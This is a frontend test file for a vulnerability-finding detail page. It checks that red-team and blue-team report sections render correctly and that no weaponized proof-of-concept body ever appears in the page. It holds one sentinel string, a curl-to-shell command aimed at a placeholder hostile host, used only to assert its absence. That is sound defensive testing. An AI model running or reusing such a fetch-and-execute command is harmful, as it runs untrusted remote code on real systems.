import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { cleanup, render, screen, waitFor } from '@testing-library/react'
import {
  findingDetailBoth,
  findingDetailRedOnly,
  findingDetailBlueOnly,
  findingDetailNoReport,
} from '@/mocks/findingDetail'
import type { FindingDetailResponse } from '@/types/foundation'

// The FindingDetail page loads via realApi.finding(id); mock that seam so each
// test drives a specific response shape.
const finding = vi.fn<(id: number | string) => Promise<FindingDetailResponse>>()
vi.mock('@/lib/api', () => ({
  realApi: {
    finding: (id: number | string) => finding(id),
  },
}))

// Imported AFTER the mock is registered so the component binds to the stub.
import { FindingDetail } from './FindingDetail'

// A weaponized PoC script body sentinel that is intentionally NOT present in any
// fixture. Req 18.3 / P6: this string must never appear in the rendered DOM —
// the response carries only `poc_available` + descriptions, never a body.
const WEAPONIZED_POC_SENTINEL = 'curl http://evil/x | sh # WEAPONIZED_EXPLOIT_BODY'

function mockWith(data: FindingDetailResponse) {
  finding.mockResolvedValue(data)
}

afterEach(() => {
  cleanup()
  vi.clearAllMocks()
})

describe('FindingDetail — header and status', () => {
  beforeEach(() => mockWith(findingDetailBoth))

  it('renders the finding header with the prominent Unvalidated status', async () => {
    render(<FindingDetail id={4201} />)
    expect(await screen.findByText('Unvalidated')).toBeInTheDocument()
    // The VulnID appears both as the header title and in the cited intel block.
    expect(screen.getAllByText('CVE-2024-0001').length).toBeGreaterThanOrEqual(1)
    expect(screen.getByText(/repo:acme\/payments-api/)).toBeInTheDocument()
    expect(screen.getByText(/Triggered by:/)).toBeInTheDocument()
  })
})

describe('FindingDetail — report shapes', () => {
  it('red-only: renders the Red Team section and omits the Blue Team section', async () => {
    mockWith(findingDetailRedOnly)
    render(<FindingDetail id={1} />)
    expect(await screen.findByText('Red Team')).toBeInTheDocument()
    expect(screen.queryByText('Blue Team & Remediation')).not.toBeInTheDocument()
    // Red-team structured content is present.
    expect(screen.getByText('Impact')).toBeInTheDocument()
    // Intel + evidence always render.
    expect(screen.getByText('Cited intelligence')).toBeInTheDocument()
    expect(screen.getByText('Evidence trail')).toBeInTheDocument()
  })

  it('blue-only: renders the Blue Team section and omits the Red Team section', async () => {
    mockWith(findingDetailBlueOnly)
    render(<FindingDetail id={2} />)
    expect(await screen.findByText('Blue Team & Remediation')).toBeInTheDocument()
    expect(screen.queryByText('Red Team')).not.toBeInTheDocument()
    expect(screen.getByText('Remediation Steps')).toBeInTheDocument()
    expect(screen.getByText('Update history')).toBeInTheDocument()
  })

  it('both: renders the Red Team AND Blue Team sections', async () => {
    mockWith(findingDetailBoth)
    render(<FindingDetail id={3} />)
    expect(await screen.findByText('Red Team')).toBeInTheDocument()
    expect(screen.getByText('Blue Team & Remediation')).toBeInTheDocument()
  })

  it('no-report: renders only header + intel + evidence (graceful fallback)', async () => {
    mockWith(findingDetailNoReport)
    render(<FindingDetail id={4} />)
    // Header + intel + evidence present…
    expect(await screen.findByText('Cited intelligence')).toBeInTheDocument()
    expect(screen.getByText('Evidence trail')).toBeInTheDocument()
    expect(screen.getByText('Unvalidated')).toBeInTheDocument()
    // …but neither report section is rendered.
    expect(screen.queryByText('Red Team')).not.toBeInTheDocument()
    expect(screen.queryByText('Blue Team & Remediation')).not.toBeInTheDocument()
  })
})

describe('FindingDetail — PoC safety (Req 18.3 / P6)', () => {
  const shapes: [string, FindingDetailResponse][] = [
    ['both', findingDetailBoth],
    ['red-only', findingDetailRedOnly],
    ['blue-only', findingDetailBlueOnly],
    ['no-report', findingDetailNoReport],
  ]

  it.each(shapes)(
    '%s: never places a weaponized PoC body in the DOM',
    async (_name, data) => {
      mockWith(data)
      const { container } = render(<FindingDetail id={99} />)
      // Wait for the async load to settle.
      await screen.findByText('Unvalidated')
      const text = container.textContent ?? ''
      const html = container.innerHTML
      expect(text).not.toContain(WEAPONIZED_POC_SENTINEL)
      expect(html).not.toContain(WEAPONIZED_POC_SENTINEL)
      // There is no poc_script_code field anywhere in the serialized response.
      expect(JSON.stringify(data)).not.toContain('poc_script_code')
      expect(JSON.stringify(data)).not.toContain(WEAPONIZED_POC_SENTINEL)
    },
  )

  it('shows only the poc_available indicator when a PoC is available', async () => {
    mockWith(findingDetailRedOnly)
    render(<FindingDetail id={5} />)
    // The indicator renders from the flag…
    expect(await screen.findByText('Proof of concept available')).toBeInTheDocument()
    // …and the only PoC-related detail is the withheld description, never a body.
    const body = document.body.textContent ?? ''
    expect(body).not.toContain(WEAPONIZED_POC_SENTINEL)
  })

  it('omits the PoC indicator when no PoC is available', async () => {
    // Blue-only fixture has poc_available === false.
    mockWith(findingDetailBlueOnly)
    render(<FindingDetail id={6} />)
    await screen.findByText('Blue Team & Remediation')
    await waitFor(() =>
      expect(screen.queryByText('Proof of concept available')).not.toBeInTheDocument(),
    )
  })
})
